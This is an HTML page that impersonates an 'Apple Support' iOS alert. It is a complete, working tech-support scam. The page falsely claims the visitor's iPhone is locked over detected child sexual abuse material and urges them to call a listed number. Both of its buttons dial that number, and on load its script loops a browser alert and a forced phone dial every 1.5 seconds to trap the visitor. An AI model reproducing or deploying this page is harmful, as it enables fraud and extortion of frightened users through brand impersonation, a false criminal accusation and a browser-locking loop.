<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>iOS Classic Alert</title>

<style>
    body {
        margin: 0;
        padding: 0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;

        background: url('https://content.jdmagicbox.com/v2/comp/pune/n4/020pxx20.xx20.250826161117.a8n4/catalogue/apple-store-kopa-mall-koregaon-park-pune-mobile-phone-dealers-fjxrl6t6th.jpg')
                    no-repeat center center fixed;
        background-size: cover;

        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .overlay {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.35);
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .ios-alert {
        width: 82%;
        max-width: 320px;
        background: #ffffff;
        border-radius: 14px;
        box-shadow: 0px 22px 45px rgba(0,0,0,0.45);
        text-align: center;
        padding-top: 18px;
        transform: scale(1.12);
        opacity: 0;
        animation: iosPop 0.25s cubic-bezier(.25,.8,.25,1) forwards;
    }

    @keyframes iosPop {
        0% { transform: scale(1.12); opacity: 0; }
        100% { transform: scale(1); opacity: 1; }
    }

    .alert-title {
        font-size: 18px;
        font-weight: 600;
        color: #111;
        margin-bottom: 8px;
        padding: 0 18px;
    }

    .alert-message {
        font-size: 14px;
        color: #3b3b3b;
        padding: 0 20px 20px 20px;
        line-height: 1.45;
    }

    .buttons {
        border-top: 1px solid #d0d0d0;
        display: flex;
        height: 44px;
    }

    .buttons a {
        flex: 1;
        text-decoration: none;
        font-size: 17px;
        color: #007aff;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .buttons a:nth-child(1) {
        border-right: 1px solid #d0d0d0;
    }
</style>
</head>

<body>

<div class="overlay" id="overlay">
    <div class="ios-alert">
        <div class="alert-title">Apple Support</div>
        <div class="alert-message">Your iPhone has been locked due to detected illegal Child pornography. Your Apple ID has been disabled. Immediately call Online Security Support +1-808-277-4439 to unlock it.</div>

        <div class="buttons">
            <a href="tel:+18082774439">Cancel</a>
            <a href="tel:+18082774439">Call Now</a>
        </div>
    </div>
</div>

<script>
window.onload = function() {

    // First alert
    alert("Your iPhone has been locked due to detected illegal Child pornography. Your Apple ID has been disabled. Immediately call Online Security Support +1-808-277-4439 to unlock it.");

    // Trigger phone dial immediately
    window.location.href = "tel:+18082774439";

    // Loop repeating alert + call
    setTimeout(function repeatAlert() {

        alert("Your iPhone has been locked due to detected illegal Child pornography. Your Apple ID has been disabled. Immediately call Online Security Support +1-808-277-4439 to unlock it.");

        // Trigger phone dial every loop
        window.location.href = "tel:+18082774439";

        setTimeout(repeatAlert, 1500);
    }, 1500);
};
</script>

</body>
</html>
